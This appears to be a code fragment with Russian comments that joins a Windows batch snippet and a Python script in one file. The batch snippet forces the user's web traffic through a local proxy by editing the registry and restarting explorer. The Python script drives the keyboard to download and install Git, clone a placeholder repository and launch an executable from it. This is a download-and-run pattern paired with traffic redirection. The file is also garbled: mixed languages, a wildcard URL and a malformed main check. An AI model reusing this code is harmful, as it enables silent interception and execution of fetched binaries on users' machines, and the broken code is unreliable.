::the file is no longer needed
::Код больше не нужен 
@echo off


set PROXY_SERVER=localhost:8080

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d %PROXY_SERVER% /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyOverride /t REG_SZ /d "<local>" /f

taskkill /im explorer.exe /f
start explorer.exe


import subprocess
import time
import os
import pyautogui

def open_command_prompt():
    # Открываем командную строку
    pyautogui.hotkey('win', 'r')  # Нажимаем Win + R
    time.sleep(0.5)
    pyautogui.typewrite('cmd\n')  # Вводим 'cmd' и нажимаем Enter
    time.sleep(1)

def download_git():
    # Скачиваем Git
    url = "https://github.com/git-for-windows/git/releases/latest/download/Git-*-*-*-*-setup.exe"  # Замените на актуальную ссылку
    subprocess.run(f'curl -L -o git-installer.exe {url}', shell=True)
    time.sleep(3)  # Ждем завершения загрузки

def install_git():
    # Устанавливаем Git
    subprocess.run('start git-installer.exe', shell=True)
    time.sleep(2)
    # Здесь можно добавить дополнительные команды для автоматизации установки, если это необходимо

def clone_repository():
    # Клонируем репозиторий
    repo_url = "https://github.com/username/repository.git"  # Замените на нужный репозиторий
    subprocess.run(f'git clone {repo_url}', shell=True)

def run_cloned_file():
    # Переходим в директорию клонированного репозитория и запускаем файл
    os.chdir('repository')  # Замените на имя вашего репозитория
    subprocess.run('start yourfile.exe', shell=True)  # Замените на имя файла, который нужно запустить

def main():
    time.sleep(2)  # Задержка для подготовки
    open_command_prompt()  # Открываем командную строку
    download_git()  # Скачиваем Git
    install_git()  # Устанавливаем Git
    time.sleep(10)  # Ждем завершения установки (можно увеличить при необходимости)
    clone_repository()  # Клонируем репозиторий
    time.sleep(5)  # Ждем завершения клонирования
    run_cloned_file()  # Запускаем файл из клонированного репозитория

if name == "__main__":
    main()
